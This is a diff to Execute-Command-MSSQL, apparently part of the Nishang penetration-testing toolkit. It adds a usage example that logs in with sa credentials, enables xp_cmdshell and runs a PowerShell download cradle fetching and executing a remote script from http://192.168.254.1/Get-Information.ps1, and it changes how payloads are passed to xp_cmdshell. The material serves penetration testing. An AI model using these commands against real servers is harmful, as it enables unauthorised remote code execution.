@@ -24,6 +24,17 @@ PS> Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234
 .EXAMPLE
 PS> Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234
 
+.EXAMPLE
+PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234
+Connecting to target...
+Enabling XP_CMDSHELL...
+Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): P
+Starting PowerShell on the target..
+PS target> iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Get-Information.ps1''));Get-Information
+
+
+Use above to execute scripts on a target.
+
 .LINK
 http://www.labofapenetrationtester.com/2012/12/command-execution-on-ms-sql-server-using-powershell.html
 https://github.com/samratashok/nishang
@@ -93,7 +104,7 @@ http://www.truesec.com
             write-host "`n`nStarting PowerShell on the target..`n"
             write-host -NoNewline "PS $ComputerName> "
             $payload = read-host
-            $cmd = "EXEC xp_cmdshell 'powershell.exe -Command `"& {$payload}`"'"
+            $cmd = "EXEC xp_cmdshell 'powershell.exe -Command $payload'"
         }
         elseif ($shell -eq "S")
         {
